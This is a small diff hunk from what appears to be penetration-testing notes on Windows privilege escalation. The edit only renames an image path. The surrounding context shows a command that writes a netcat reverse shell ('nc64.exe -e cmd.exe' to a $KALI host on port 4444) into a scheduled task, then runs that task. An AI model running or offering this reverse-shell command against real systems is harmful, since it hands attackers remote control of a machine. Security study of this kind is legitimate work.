@@ -86,7 +86,7 @@ echo c:\tools\nc64.exe -e cmd.exe $KALI 4444 > C:\tasks\schtask.bat
 schtasks /run /tn vulntask
 ```
 
-<figure><img src="../../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (30) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Abusing Service Misconfigurations
 
